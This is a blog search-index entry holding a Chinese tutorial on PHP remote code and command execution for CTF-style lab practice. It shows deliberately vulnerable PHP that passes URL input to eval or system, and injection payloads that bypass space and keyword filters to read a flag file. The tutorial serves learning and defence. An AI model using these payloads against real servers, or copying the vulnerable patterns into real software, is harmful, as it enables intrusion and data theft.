<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>rce漏洞学习</title>
      <link href="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="rce漏洞学习"><a href="#rce漏洞学习" class="headerlink" title="rce漏洞学习"></a>rce漏洞学习</h1><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="代码执行漏洞原理："><a href="#代码执行漏洞原理：" class="headerlink" title="代码执行漏洞原理："></a>代码执行漏洞原理：</h3><p>传入php代码到执行函数的变量，客户端可控，并且没有严格的过滤，攻击者可以随意输入自己想执行的代码，并且这些代码在服务端执行</p><h3 id="代码执行漏洞危害："><a href="#代码执行漏洞危害：" class="headerlink" title="代码执行漏洞危害："></a>代码执行漏洞危害：</h3><p>攻击者可以通过RCE继承web用户的权限，执行php代码，如果web的权限比较高的话，就可以读写目标服务器任意文件的内容，甚至控制整个网站</p><h3 id="代码执行的一些函数"><a href="#代码执行的一些函数" class="headerlink" title="代码执行的一些函数"></a>代码执行的一些函数</h3><h4 id="1-eval"><a href="#1-eval" class="headerlink" title="1.eval()"></a>1.eval()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将$cmd中的代码，<code>打印到下一行当做当前php文件中的一段代码执行</code></p><p>所以$cmd一般需要以<code>;</code>结尾，作为一个完整的php代码指令</p><p>例如，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd=system(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="命令执行漏洞原理："><a href="#命令执行漏洞原理：" class="headerlink" title="命令执行漏洞原理："></a>命令执行漏洞原理：</h3><p>应用在调用这些函数执行系统命令的时候，如果将用户输入作为系统命令的参数拼接到命令行中，如果没对用户的输入法进行过滤的话，就会造成命令执行漏洞。</p><h3 id="命令执行漏洞危害："><a href="#命令执行漏洞危害：" class="headerlink" title="命令执行漏洞危害："></a>命令执行漏洞危害：</h3><blockquote><p>1.继承web服务器程序权限，去执行系统命令</p><p>2.继承web服务器权限，读取文件</p><p>3.反弹shell</p><p>4.控制整个网站，控制整个服务器</p></blockquote><h3 id="命令执行的一些函数"><a href="#命令执行的一些函数" class="headerlink" title="命令执行的一些函数"></a>命令执行的一些函数</h3><h4 id="1-system"><a href="#1-system" class="headerlink" title="1.system()"></a>1.system()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>$_GET</code>是一个预定义的php超全局变量，它用于收集来自url的值。从url参数中获取名为<code>“benben”</code>的参数值，并将其存储在<code>$cmd</code>变量中，</p><p><code>isset</code>函数检查<code>$cmd</code>变量是否已设置且不为null。如果条件为真，则执行 <code>system($cmd)</code> 语句。这将在服务器上执行 <code>$cmd</code> 变量中指定的系统命令。</p></blockquote><p><strong>这段代码存在的安全风险是它允许用户通过url参数执行任意系统命令。</strong></p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816093929988.png" alt="image-20230816093929988"></p><h4 id="2-exec"><a href="#2-exec" class="headerlink" title="2.exec()"></a>2.exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>参数</p><p>exec(a,b,c)</p><p>有三个参数，第一个参数a是我们要执行的指令，第二个参数b，为存储我们的命令执行结果的一个数组，相当于一个载体。</p><p>c参数于命令执行无关。</p></li><li><p>回显</p><p>本身可以回显，但是如果我们没有设置第二个参数进行存储的话，它只会回显最后一位的结果，所以将参数存储之后就可以通过print_r之类将函数打印出来。</p></li></ul><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816105719961.png" alt="image-20230816105719961"></p><h4 id="3-shell-exec"><a href="#3-shell-exec" class="headerlink" title="3.shell_exec"></a>3.shell_exec</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>参数</p><p>一个执行的命令</p></li><li><p>回显</p><p>不能自动回显，需要打印函数帮助输出</p><blockquote><p>从url中获取参数值，并存储在<code>$cmd</code>变量中，使用shell_exec()函数执行$cmd变量中的命令，比并将结果存储在<code>$output</code>变量中，用echo打印<code>$output</code>内容。</p><p>calc:弹计算器命令</p></blockquote></li></ul><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816163337507.png" alt="image-20230816163337507"></p><h4 id="4-反引号"><a href="#4-反引号" class="headerlink" title="4.``反引号"></a>4.``反引号</h4><p>在无字母，无数字的回显中使用极多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$cmd</span>`,PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>参数</p><p>一个，执行指令</p></li><li><p>回显</p><p>不能回显，需要帮助</p><blockquote><p>反引号运算符里面的变量会被当做命令执行。反引号运算符（也称为执行运算符）用于执行 <code>$cmd</code> 变量中指定的命令，并将结果作为字符串返回。</p><p><code>PHP_EOL</code> 是一个预定义常量，它表示当前系统中的换行符。</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816211321163.png" alt="image-20230816211321163"></p></li></ul><h4 id="5-popen"><a href="#5-popen" class="headerlink" title="5.popen()"></a>5.popen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ben</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$ben</span>))&#123;</span><br><span class="line">      <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><p>执行</p></li><li><p>popen的执行需要单独拉出来，因为popen的原理是创建一个虚拟文件，但是他本身其实并不存在，而是属于一个间接的作用。这个虚拟文件来暂时存储我们命令执行的内容，然后我们对这个虚拟文件进行操作。例如我们输入ls，它会把ls的执行结果放入到这个虚拟文件中。</p></li><li><p>参数</p><p>有两个，第一个参数用来表示我们想要执行的命令，第二个参数是用来表示我们读取这个虚拟文件的方式，有‘r’读取，或者‘w’写入，两种</p></li><li><p>回显</p><p>没有回显，需要一些文件读取函数去操作这个虚拟文件，才能得到命令执行的结果。</p></li></ul></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816223721060.png" alt="image-20230816223721060"></p><h2 id="靶场过滤练习"><a href="#靶场过滤练习" class="headerlink" title="靶场过滤练习"></a>靶场过滤练习</h2><h4 id="1-替换，绕过函数过滤"><a href="#1-替换，绕过函数过滤" class="headerlink" title="1.替换，绕过函数过滤"></a>1.替换，绕过函数过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/exec|system|popen|proc_open|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你是黑客么？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_match()是我们RCE题里面很常见的一种过滤函数</p><p>有两个参数 第一个参数用来列举我们想要过滤的东西，一</p><p>般里面的内容都是用正则表达式来表示，第二个参数是传</p><p>入我们要进行过滤操作的字符串或者说是目标</p><p>要解，就是使用没有被过滤的，比如passthru()</p><h4 id="2-操作系统链接符"><a href="#2-操作系统链接符" class="headerlink" title="2.操作系统链接符"></a>2.操作系统链接符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>.<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是<code>system()</code>里面的内容将<code>“ls”</code>与我们参数cmd字符串连接起来了，导致我们输入cmd命令执行不了</p><p>解决方法：我们尝试在cmd命令前加一个<code>连接符</code>，或者<code>管道输出符，就能够实现同时执行多条命令</code></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=;cat /flag</span><br></pre></td></tr></table></figure><blockquote><p>可以用<code>‘;’</code>，也可以用<code>‘&amp;’、‘|’、‘||’、‘&amp;&amp;’</code></p><p><code>&#39;&amp;&amp;&#39;</code>:它是看我们的指令前面的没有成功执行的话，后面的也不会执行</p><p><code>‘|’</code>:管道输出符算是起到一个过滤网的作用，我们回显的结果就会被管道输出符以及它后面的条件所过滤，最终得到结果。</p><p><code>‘||’</code>相当于if-else的作用</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">       <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>它的作用，如果后台对我们的指令进行了处理，比如说将我们的所有</p><p>指令全部‘放入垃圾桶’，就通过在cmd变量最后输入‘||’就只会执</p><p>行我们的想要的指令，后面的垃圾桶操作就不会去执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>这条代码的作用就是将我们的指令丢入垃圾桶的作用代码，特征很明</p><p>显 最重要的是后面的 <strong>2&gt;&amp;1</strong></p><h4 id="3-过滤绕过"><a href="#3-过滤绕过" class="headerlink" title="3.过滤绕过"></a>3.过滤绕过</h4><p>1.空格过滤以及绕过方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;# #&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;过滤后的命令：&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&lt;/br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;命令执行结果如下：&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>绕过方法</p><h5 id="1-大括号绕过"><a href="#1-大括号绕过" class="headerlink" title="1.大括号绕过"></a>1.大括号绕过</h5><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;cat,/flag&#125;</span><br></pre></td></tr></table></figure><p>{}的作用就是起到一个里面的逗号‘,’充当空格的作用。</p><p>正常linux下，打印flag命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">___^____</span><br></pre></td></tr></table></figure><p>中间是有空格的，但是过滤了空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat/flag</span><br></pre></td></tr></table></figure><p>格式错误，命令无法正常执行，所以需要一些其他格式，能代替空格</p><p>起到分割命令和操作对象的作用</p><hr><p>当需要多个空格的命令时，用{}中的,也是可以当做空格，并不只是当一个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;mv,1.txt,a.txt&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818212614623.png" alt="image-20230818212614623"></p><h5 id="2-IFS-绕过"><a href="#2-IFS-绕过" class="headerlink" title="2.${IFS}绕过"></a>2.${IFS}绕过</h5><p>其实<code>$IFS</code>的当作变量，不会自动转化为空格。导致绕过失败</p><p>所以保险起见还是写上{}将内容包起来，说明它不是变量</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818214219207.png" alt="image-20230818214219207"></p><h5 id="3-URL编码绕过"><a href="#3-URL编码绕过" class="headerlink" title="3.URL编码绕过"></a>3.URL编码绕过</h5><p>如果要绕过空格过滤，一般都不会用<code>%20</code>(空格编码后的结果)一般都是用<code>%09</code>(tab的编码结果)</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%09flag</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818221159957.png" alt="image-20230818221159957"></p><h5 id="4-重定向符号绕过"><a href="#4-重定向符号绕过" class="headerlink" title="4.重定向符号绕过"></a>4.重定向符号绕过</h5><blockquote><p>&lt; &lt;&gt;两种方式</p><p>就是把我们在cat后面加上&lt;后 就表示先让cat指令待命，然后</p><p>把我们后面输入的内容放入cat去执行</p><p>不推荐使用cat&lt;&gt;flag 因为&lt;&gt;会创建一个新的文件，会导致一</p><p>些不必要的麻烦。</p></blockquote><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat&lt;flag</span><br><span class="line">?cmd=cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818223956380.png" alt="image-20230818223956380"> </p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230818224106755.png" alt="image-20230818224106755"></p><h4 id="4-文件名过滤-以及绕过方法"><a href="#4-文件名过滤-以及绕过方法" class="headerlink" title="4.文件名过滤 以及绕过方法"></a>4.文件名过滤 以及绕过方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;命令有问题哦，来黑我丫！！！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>preg_match()里面的内容就是通过正则表达把我们的flag </p><p>system php等字样给过滤掉了。我们想想怎么绕过</p><p>绕过方法</p><h5 id="1-通配符绕过"><a href="#1-通配符绕过" class="headerlink" title="1.通配符绕过"></a>1.通配符绕过</h5><p>通配符的意思就是它可以代表任何的字母然后穷举所有字母结果来</p><p>一个一个去执行命令</p><p>一个是<code>‘?’</code> 一个是<code>‘*’</code></p><p><code>&#39;?&#39;</code> 能够代表任何一个字符，但只能代表一个 （=1）</p><p><code>‘*’</code>星号能代表所有字符 （&gt;=0）</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f?lg&#x27;)</span><br></pre></td></tr></table></figure><p>意思是就是cat f<code>a</code>ag到f<code>z</code>ag开始一个个试出来           </p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819103945371.png" alt="image-20230819103945371"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat *&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819105755560.png" alt="image-20230819105755560"></p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819110006594.png" alt="image-20230819110006594"></p><p>php代码不能完全打印在网页上，我们尝试查看网页源代码</p><h5 id="2-‘-’反斜杠"><a href="#2-‘-’反斜杠" class="headerlink" title="2.‘\’反斜杠"></a>2.‘\’反斜杠</h5><p>\的作用其实算是一个命令连接符，我们输入<code>cat f\la\g</code>它其实</p><p>在linux里面就直接认为为了cat /flag 但是过滤操作又是在</p><p>php页面里面，linux本身不受影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f\la\g&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819113756446.png" alt="image-20230819113756446"></p><h5 id="3-单引号-双引号"><a href="#3-单引号-双引号" class="headerlink" title="3.单引号 双引号"></a>3.单引号 双引号</h5><p>原理一样的，过滤操作只在只在php页面中，linux系统执行命令的时候是不会受到影响的，因为在命令行里面，<code>“ ” “</code>会被无视掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f&quot;&quot;lag.p&quot;&quot;hp&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819143845143.png" alt="image-20230819143845143"></p><h5 id="4-一些特殊字符-系列"><a href="#4-一些特殊字符-系列" class="headerlink" title="4.一些特殊字符 $系列"></a>4.一些特殊字符 $系列</h5><p>原理也是一样的，只是形式不同，因为正则匹配它是连续匹配，如</p><p>果连续匹配成功判定为真。</p><p>我们只需要在不影响命令执行的情况下，分割命令就行</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f$9lag&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p><code>$9是当前系统shell进程第九个参数持有者，始终为空字符串</code></p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819152437622.png" alt="image-20230819152437622"></p><h5 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;a=f;b=la;c=g;cat $a$b$c&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>意思翻译过来就是我们在内部定义变量，然后用变量将我们的命令拼接起来</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819153146923.png" alt="image-20230819153146923"></p><h4 id="5-cat过滤绕过"><a href="#5-cat过滤绕过" class="headerlink" title="5.cat过滤绕过"></a>5.cat过滤绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|shell|\&#x27;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>绕过方法总结</p><h5 id="1-tac反向显示"><a href="#1-tac反向显示" class="headerlink" title="1.tac反向显示"></a>1.tac反向显示</h5><blockquote><p>本来是从第一行显示，用了 <code>tac</code>之后就是从最后一行开始显</p><p>示一直到第一行。</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819154508054.png" alt="image-20230819154508054"></p><h5 